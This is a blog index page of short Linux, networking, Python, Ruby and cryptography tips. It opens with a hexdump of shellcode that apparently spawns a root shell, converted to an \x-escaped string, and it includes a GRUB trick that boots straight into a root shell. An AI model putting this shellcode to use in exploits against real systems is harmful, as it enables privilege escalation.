<span class="m">00000010</span>  2f 2f <span class="m">73</span> <span class="m">68</span> <span class="m">68</span> 2f <span class="m">62</span> <span class="m">69</span>  6e <span class="m">89</span> e3 <span class="m">51</span> <span class="m">89</span> e2 <span class="m">53</span> <span class="m">89</span>  <span class="p">|</span>//shh/bin..Q..S.<span class="p">|</span>
<span class="m">00000020</span>  e1 <span class="nb">cd</span> <span class="m">80</span>                                          <span class="p">|</span>...<span class="p">|</span>
<span class="m">00000023</span></code></pre></div>
<p>Fortunately, hexdump is feature-rich and allows you to specify format strings, iteration, and step:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ hexdump -v -e <span class="s1">&#39;&#34;\\\x&#34; 1/1 &#34;%02x&#34;&#39;</span> shellcode
<span class="se">\x</span><span class="m">31</span><span class="se">\x</span>c0<span class="se">\x</span><span class="m">31</span><span class="se">\x</span>db<span class="se">\x</span><span class="m">31</span><span class="se">\x</span>c9<span class="se">\x</span><span class="m">99</span><span class="se">\x</span>b0<span class="se">\x</span>a4<span class="se">\x</span>cd<span class="se">\x</span><span class="m">80</span><span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span><span class="m">58</span><span class="se">\x</span><span class="m">51</span><span class="se">\x</span><span class="m">68</span><span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span><span class="m">73</span><span class="se">\x</span><span class="m">68</span><span class="se">\x</span><span class="m">68</span><span class="se">\x</span>2f<span class="se">\x</span><span class="m">62</span><span class="se">\x</span><span class="m">69</span><span class="se">\x</span>6e<span class="se">\x</span><span class="m">89</span><span class="se">\x</span>e3<span class="se">\x</span><span class="m">51</span><span class="se">\x</span><span class="m">89</span><span class="se">\x</span>e2<span class="se">\x</span><span class="m">53</span><span class="se">\x</span><span class="m">89</span><span class="se">\x</span>e1<span class="se">\x</span>cd<span class="se">\x</span><span class="m">80</span></code></pre></div>
<p><code>1/1</code> represents the iteration-count/byte-count, that is, how many times we
want to iterate over the input and how large each chunk of the input will be.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/ip-masquerading/">IP masquerading</a></h2>
      <time>Jan 11, 2012</time>
      <p>Not long ago, I found myself in need of a subnet of virtual machines. Using
VirtualBox I configured a number of VMs with <code>Internal Network</code>
interfaces and a gateway VM with two interfaces &mdash; one <code>Internal Network</code>
interface and one <code>NAT</code> interface.</p>

<p>It isn&rsquo;t the first time I needed to configure a Linux box as a gateway, but I
always forget how to configure IP masquerading. So, needless to say I&rsquo;m taking
note of it here:</p>

<p><b>1. Configure the external interface:</b></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  $ ifconfig eth0 <span class="m">10</span>.0.0.2 netmask <span class="m">255</span>.255.255.0 
  $ <span class="nb">echo</span> <span class="s2">&#34;nameserver 8.8.8.8&#34;</span> &gt; /etc/resolv.conf
 
  <span class="c1"># or for dhcp
</span><span class="c1"></span>  $ dhclient eth0</code></pre></div>
<p><b>2. Configure the internal interface:</b></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  $ ifconfig eth1 <span class="m">192</span>.168.0.1 netmask <span class="m">255</span>.255.255.0</code></pre></div>
<p><b>3. Configure iptables:</b></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  $ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre></div>
<p><b>4. Enable ip_forwarding:</b></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  $ <span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward</code></pre></div>
<p><b> or configure it in <code>/etc/sysctl.conf</code>,
   which will persist after reboot.</b></p>

<p>Obviously, depending on your distro, your interface configuration, etcetera,
etcetera, you will have to adjust.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/list/">list</a></h2>
      <time>Jan 4, 2012</time>
      <pre>
man lsusb
man lspci
man lshw
man lsof
</pre>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/bash-tcp-connections/">bash tcp connections</a></h2>
      <time>Jan 3, 2012</time>
      <p>Bash, if compiled accordingly, has pseudo-device files that allow you to open
TCP connections:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"> $ <span class="c1"># /dev/tcp/$host/$port
</span><span class="c1"></span> $ <span class="nb">echo</span> foo &gt; /dev/tcp/127.0.0.1/57005</code></pre></div>
<p>Of course, <code>nc</code> is a more functional alternative, but this is an
interesting bash feature nonetheless.</p>

<p><a href="http://tldp.org/LDP/abs/html/devref1.html">http://tldp.org/LDP/abs/html/devref1.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/single-user-boot-for-grub-2/">single user boot for grub 2</a></h2>
      <time>Dec 21, 2011</time>
      <p>Ubuntu changed to grub 2 and I often find myself looking up how to finagle my
way into a single user shell.</p>

<pre style="font-size: 17px">

Step 1.
   Hold the right <b>shift</b> to display the grub menu at boot time.

Step 2.
   Select the correct kernel, press <b>CTRL+e</b> to edit the boot command.

Step 3.
   Append the two directives  <b> Single init=/bin/bash </b>

Step 4.
   Press <b>CTRL+x</b> to boot and wait for the root prompt.

Step 5.
   Remount / as read/write with the command:
     # mount -o remount,rw /

</pre>

<p>When you are finished, issue a <code>reboot -f</code> unless you are fond of kernel panics.</p>

<p>*YMMV</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/fsck-on-startup/">fsck on startup</a></h2>
      <time>Dec 21, 2011</time>
      <p>Easiest way I&rsquo;ve seen to force <code>fsck</code> on the next boot:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"> sudo touch /forcefsck</code></pre></div>
<p>That easy, thanks cyberciti.biz.</p>

<p><a href="http://www.cyberciti.biz/faq/linux-force-fsck-on-the-next-reboot-or-boot-sequence/">http://www.cyberciti.biz/faq/linux-force-fsck-on-the-next-reboot-or-boot-sequence/</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/ssh-config/">SSH config</a></h2>
      <time>Dec 12, 2011</time>
      <p>OpenSSH allows you to add configuration directives to <code>~/.ssh/config</code> with aliases for long hostnames or IP addresses:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat <span class="s">&lt;&lt; EOF &gt;&gt; ~/.ssh/config
</span><span class="s">Host segv                     # desired alias
</span><span class="s">    HostName segv.me          # ip address works too
</span><span class="s">    Port 22
</span><span class="s">    User foo
</span><span class="s">    LocalForward localhost:57005 192.168.0.2:57005
</span><span class="s">    IdentityFile ~/.ssh/auxiliary_rsa
</span><span class="s">EOF</span></code></pre></div>
<p>This solution is better than using <code>/etc/hosts</code> for obvious reasons. There are
a great number of options that allow you choose everything from username to
encryption cipher preferences on a host-by-host basis.  <code>man ssh_config</code></p>

<p>I&rsquo;ve added a nasty little bashism too, as a bonus:<br />
<a href="http://tldp.org/LDP/abs/html/here-docs.html">http://tldp.org/LDP/abs/html/here-docs.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/splat/">* splat</a></h2>
      <time>Dec 11, 2011</time>
      <p>Python has a seldom used unary operator that lets you &ldquo;flatten&rdquo; lists and
dictionaries into function arguments.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">foo</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
  <span class="k">print</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="p">,</span><span class="n">c</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">li</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span> <span class="p">,</span><span class="mi">3</span><span class="p">]</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">foo</span><span class="p">(</span><span class="o">*</span><span class="n">li</span><span class="p">)</span>
<span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span></code></pre></div>
<p>The * operator converts a dictionary to keyword arguments:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">foo</span><span class="p">(</span><span class="n">bar</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">baz</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">quux</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
  <span class="k">print</span> <span class="n">bar</span><span class="p">,</span> <span class="n">baz</span><span class="p">,</span> <span class="n">quux</span>

<span class="o">&gt;&gt;&gt;</span> <span class="n">d</span> <span class="o">=</span> <span class="p">{</span><span class="sa"></span><span class="s2">&#34;bar&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="sa"></span><span class="s2">&#34;baz&#34;</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span> <span class="sa"></span><span class="s2">&#34;quux&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">}</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">foo</span><span class="p">(</span><span class="o">**</span><span class="n">d</span><span class="p">)</span>
<span class="mi">1</span> <span class="mi">2</span> <span class="mi">3</span></code></pre></div>
<p>Simple, but useful.</p>

<p><a href="http://docs.python.org/tutorial/controlflow.html#unpacking-argument-lists">http://docs.python.org/tutorial/controlflow.html#unpacking-argument-lists</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/time-now-to_s-magic/">Time.now.to_s(:magic)</a></h2>
      <time>Dec 10, 2011</time>
      <p>Many Rails developers default to <code>strftime</code> for converting their dates to
appropriate strings.</p>

<p>However, Rails has the often overlooked time conversion extensions which are
must faster on the draw:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"> <span class="o">&gt;</span> <span class="n">t</span> <span class="o">=</span> <span class="no">Time</span><span class="o">.</span><span class="n">now</span>
 <span class="o">=&gt;</span> <span class="no">Sat</span> <span class="no">Dec</span> <span class="mi">10</span> <span class="o"></span><span class="mi">11</span><span class="o"></span><span class="p">:</span><span class="mi">14</span><span class="o"></span><span class="p">:</span><span class="mo">04</span> <span class="o">-</span><span class="mo">0500</span> <span class="o"></span><span class="mi">2011</span> 

 <span class="o">&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">)</span>
 <span class="o">=&gt;</span> <span class="s2">&#34;2011-12-10 11:14:04&#34;</span> 
 
 <span class="o">&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="ss">:time</span><span class="p">)</span>
 <span class="o">=&gt;</span> <span class="s2">&#34;11:14&#34;</span> 

 <span class="o">&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="ss">:short</span><span class="p">)</span>
 <span class="o">=&gt;</span> <span class="s2">&#34;10 Dec 11:14&#34;</span> 
 
 <span class="o">&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="ss">:number</span><span class="p">)</span>
 <span class="o">=&gt;</span> <span class="s2">&#34;20111210111404&#34;</span> </code></pre></div>
<p>To see a complete listing of the formats look no further than
<code>Time::DATE_FORMATS</code>.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/linkage/">Linkage</a></h2>
      <time>Dec 9, 2011</time>
      <p>I find this incredibly helpful:
<a href="http://hyperpolyglot.org/scripting">http://hyperpolyglot.org/scripting</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/recycle-arguments/">Recycle Arguments</a></h2>
      <time>Dec 9, 2011</time>
      <p>Ok, so last post was a bit heavy. How about some more bash. So, thanks to sudo
the <code>!!</code> word designator has become very popular:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ apache2ctl restart
Permission denied: ...

$ sudo !!
sudo apache2ctl restart</code></pre></div>
<p>Very cool, but you can also reuse arguments with the <code>!!</code> word designator:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ cp /home/user/some/really/long/path /home/user/foo

$ ls -lha !!:1
ls -lha /home/user/some/really/long/path</code></pre></div>
<p>So this <code>!!:n</code> lets you grab the nth argument, which is cool. <br /><br /></p>

<p>You can even select ranges:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ cp /home/user/some/really/long/path /home/user/foo

$ md5sum !!:1-2
md5sum /home/user/some/really/long/path /home/user/foo</code></pre></div>
<p>You can also use the asterisk to select all the arguments, but not the command:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ls /home /

$ ls -l !!:*
ls -l /home /</code></pre></div>
<p>Anyways, there are quite a few other options so check out the docs:<br />
<a href="http://www.gnu.org/software/bash/manual/bashref.html#Word-Designators">http://www.gnu.org/software/bash/manual/bashref.html#Word-Designators</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/modes-of-operation/">Modes of Operation</a></h2>
      <time>Dec 8, 2011</time>
      <p>Knowing which encryption algorithm was used is one thing, but knowing how they
used it is another.</p>

<p>Here are 5 of the 9 NIST approved block cipher <em>modes of operation</em>:</p>

<p><strong>Electronic Codebook (ECB)</strong></p>

<p>Simplest of encryption modes.<br />
Encrypts each block Bi independently.</p>

<pre>
    Encryption:

    **C<sub>i</sub> = E<sub>k</sub>(B<sub>i</sub>)**

    C<sub>i</sub>: ciphertext block i
    E<sub>k</sub>: block encryption algorithm
    B<sub>i</sub>: plaintext block i

    Decryption:

    **B<sub>i</sub> = D<sub>k</sub>(C<sub>i</sub>)**

    D<sub>k</sub>: decryption algorithm

</pre>

<p><strong>Cipher-Block Chaining Mode (CBC)</strong></p>

<p>Avoids patterns.<br />
First plaintext block is xor&rsquo;d with an <em>initialization vector</em>.<br />
Each block thereafter is xor&rsquo;d with the previous ciphertext block before being encrypted.</p>

<pre>
    Encryption:

    **C<sub>i</sub> = E<sub>k</sub>(B<sub>i</sub> xor C<sub>i-1</sub>)**

    C<sub>0</sub>: initialization vector
 
    Decryption:

    **B<sub>i</sub> = D<sub>k</sub>(C<sub>i</sub>) xor C<sub>i-1</sub>**
    
    C<sub>0</sub>: must be the _same_ initialization vector

</pre>

<p><strong>Cipher Feedback Mode (CFB)</strong></p>

<p>Similiar to CBC, B<sub>i</sub> involves C<sub>i-1</sub>.<br />
May be faster than CBC depending on block cipher.</p>

<pre>
    Encryption:

    **C<sub>i</sub> = E<sub>k</sub>(C<sub>i-1</sub>) xor B<sub>i</sub>**
 
    Decryption:

    **B<sub>i</sub> = E<sub>k</sub>(C<sub>i - 1</sub>) xor C<sub>i</sub>**

</pre>

<p><strong>Output Feedback Mode (OFB)</strong></p>

<p>Generates sequence of vectors V, where V<sub>0</sub> is the initialization vector.<br />
Block operations can be performed in parallel after vectors are are computed.</p>

<pre>
    Vectors:

    **V<sub>i</sub>: E<sub>k</sub>(V<sub>i-1</sub>)**

    Encryption:

    **C<sub>i</sub> = V<sub>i</sub> xor B<sub>i</sub>**
 
    Decryption:

    **B<sub>i</sub> = V<sub>i</sub> xor C<sub>i</sub>**

</pre>

<p><strong>Counter Mode (CTR)</strong></p>

<p>Vector generation and encryption or decryption can all be done in parallel.<br />
Start with a random seed, s, and compute offset vectors independently.</p>

<pre>
    Vectors:

    **V<sub>i</sub>: E<sub>k</sub>(s + i - 1)**

    s: random seed

    Encryption:

    **C<sub>i</sub> = V<sub>i</sub> xor B<sub>i</sub>**
 
    Decryption:

    **B<sub>i</sub> = V<sub>i</sub> xor C<sub>i</sub>**

</pre>

<p><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/index.html">http://csrc.nist.gov/groups/ST/toolkit/BCM/index.html</a>
<a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation">http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/doh-i-forgot-to-sudo/">Doh! I forgot to sudo.</a></h2>
      <time>Dec 7, 2011</time>
      <p>I often forget to <code>sudo vim</code>. I make significant changes to the file just to
find out that I don&rsquo;t have permissions to save the file.</p>

<p>Well, now that I&rsquo;ve memorized this little gem it doesn&rsquo;t matter:</p>
<div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"><span class="p">:</span><span class="nx">w</span><span class="p">!</span> <span class="nx">sudo</span> <span class="nx">tee</span> %</code></pre></div>
<p>The % is a shortcut for the filename. You are really just piping the output
through tee to the file - effectively overwriting the contents.</p>

<p>Ta-dah!</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/readline-shortcuts/">Readline Shortcuts</a></h2>
      <time>Dec 6, 2011</time>
      <pre>
CTRL + w    delete previous word
CTRL + e    jump to end of line
CTRL + a    jump to the beginning of line
CTRL + u    delete entire line before cursor
CTRL + k    delete entire line after cursor
CTRL + y    restore previously deleted word,line,etc.
CTRL + l    clear the screen
</pre>

<p><a href="http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html">http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/slippy-do-a-barrel-roll/">slippy, do a barrel roll</a></h2>
      <time>Dec 5, 2011</time>
      <p>Stumbled upon this in a stackoverflow answer. Naive C programmers write this
sort of loop:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">cnt</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">cnt</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="p">;</span> <span class="n">cnt</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="cm">/* some code */</span>
<span class="p">}</span></code></pre></div>
<p>That&rsquo;s logically an O(n<sup>2</sup>) algorithm because of the implementation
of strlen().</p>

<p>Even though I know <code>strlen</code> is implemented very efficiently, let&rsquo;s not do this.</p>

<p><a href="http://stackoverflow.com/questions/111426/did-you-apply-computational-complexity-theory-in-real-life/111861#111861">http://stackoverflow.com/questions/111426/did-you-apply-computational-complexity-theory-in-real-life/111861#111861</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/binary-in-python/">Binary in Python</a></h2>
      <time>Dec 3, 2011</time>
      <p>Somehow, I often find myself wanting the binary representation of an integer.</p>

<p>Well, Python of course has the builtin bin function, but the output always
begins with a pesky <code>0b</code>.</p>

<p>Furthermore, bin doesn&rsquo;t support padding the binary to a certain length (e.g. 8
bits). So, I use string format:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">63</span><span class="p">)</span>
<span class="sa"></span><span class="s1">&#39;0b111111&#39;</span>

<span class="o">&gt;&gt;&gt;</span> <span class="sa"></span><span class="s1">&#39;{0:08b}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">63</span><span class="p">)</span>
<span class="sa"></span><span class="s1">&#39;00111111&#39;</span></code></pre></div>
<p>Just for fun, here is a somewhat comical and more complicated example for
converting an ascii string to binary:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">s</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;foo&#34;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="p">(</span><span class="sa"></span><span class="s2">&#34;{:08b}&#34;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">*</span><span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span><span class="n">s</span><span class="p">))</span>
<span class="sa"></span><span class="s1">&#39;011001100110111101101111&#39;</span></code></pre></div>
<p>Format has many more features and reminds me of <code>printf</code> in some ways. I highly
recommend checking out the documentation.</p>

<p><a href="http://docs.python.org/library/string.html#format-specification-mini-language">http://docs.python.org/library/string.html#format-specification-mini-language</a></p>

    </article>
  

  </body>
</html>
